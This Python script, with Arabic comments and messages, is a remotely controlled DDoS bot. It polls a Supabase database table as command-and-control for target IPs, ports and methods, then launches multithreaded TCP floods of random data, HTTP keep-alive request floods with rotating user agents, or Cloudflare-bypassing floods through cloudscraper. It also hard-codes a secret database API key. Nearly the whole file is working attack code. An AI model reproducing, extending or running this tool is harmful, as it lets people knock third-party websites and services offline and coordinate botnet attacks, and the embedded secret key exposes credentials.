import socket
import requests
import random
from threading import Thread
import time
import cloudscraper

SUPABASE_URL = "https://thmtvthwdhnglwejbatg.supabase.co/rest/v1/requests"
SUPABASE_KEY = "sb_secret_2tH8QCobmJfVfv1zn-OoPw_2uwK2cKO"
HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json"
}

def MyUser_Agent():
    return [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Podcasts/1650.20 CFNetwork/1333.0.4 Darwin/21.5.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
        "AppleCoreMedia/1.0.0.19F77 (iPhone; U; CPU OS 15_5 like Mac OS X; nl_nl)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/"
    ]

def tcp_attack(ip, port, duration=60, threads=500, packet_size=65500):
    end_time = time.time() + duration
    def attack_thread():
        while time.time() < end_time:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                try:
                    sock.connect((ip, port))
                    while time.time() < end_time:
                        sock.send(random._urandom(packet_size))
                except:
                    pass
    
    for _ in range(threads):
        Thread(target=attack_thread).start()

def moonHttp(host_http: str, port: int):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
                mysocket.connect((host_http, port))
                while True:
                    mysocket.send(f'GET / HTTP/1.1\r\nHost: {host_http}\r\nUser-Agent: {random.choice(MyUser_Agent())}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except Exception:
            pass

def LaunchCFB(url, th, t):
    until = time.time() + int(t)
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while time.time() < until_datetime:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass

def ahmd(method: str, host_http: str, port: int):
    method_upper = method.upper()
    
    if method_upper == "HTTP":
        print(f"تشغيل هجوم HTTP على {host_http}:{port}")
        for _ in range(500):
            thd = Thread(target=moonHttp, args=(host_http, port))
            thd.start()
    
    elif method_upper == "TCP":
        print(f"تشغيل هجوم TCP على {host_http}:{port}")
        tcp_attack(host_http, port)
    
    elif method_upper == "bypass-cloudflare":
        print(f"تشغيل هجوم CFB على {host_http}")
        # بالنسبة لـ CFB، نحتاج إلى تحديد عدد الثريدات والوقت
        # يمكنك إضافة هذه المعلمات إلى قاعدة البيانات أو استخدام قيم افتراضية
        threads = 500
        duration = 60
        LaunchCFB(host_http, threads, duration)

def check_new_requests():
    print("جاري التشغيل... استلام الطلبات الجديدة فقط بعد الآن")
    
    try:
        response = requests.get(
            f"{SUPABASE_URL}?select=id&order=id.desc&limit=1",
            headers=HEADERS
        )
        if response.status_code == 200:
            data = response.json()
            if data and len(data) > 0:
                last_id = data[0]['id']
                print(f"تم تعيين آخر ID: {last_id}. سيتم تجاهل البيانات السابقة.")
            else:
                last_id = 0
                print("لا توجد بيانات حالياً.")
        else:
            last_id = 0
            print("لا يمكن الاتصال بقاعدة البيانات.")
    except Exception as e:
        last_id = 0
        print(f"خطأ في الحصول على آخر ID: {e}")
    
    print("في انتظار الطلبات الجديدة...")
    
    while True:
        try:
            response = requests.get(
                f"{SUPABASE_URL}?select=id,method,ip,port&order=id.desc&limit=1",
                headers=HEADERS
            )
            if response.status_code == 200:
                data = response.json()
                if data and len(data) > 0:
                    request_data = data[0]
                    if request_data['id'] > last_id:
                        print(f"تم استلام طلب جديد! ID: {request_data['id']}")
                        last_id = request_data['id']
                        method = request_data.get('method', '')
                        ip = request_data.get('ip', '')
                        port = request_data.get('port', 80)
                        
                        if ip:
                            print(f"جاري تنفيذ الهجوم على: {ip}:{port} بالطريقة: {method}")
                            ahmd(method, ip, port)
        except Exception as e:
            print(f"خطأ أثناء الفحص: {e}")
        
        time.sleep(2)

def main():
    check_new_requests()

if __name__ == "__main__":
    main()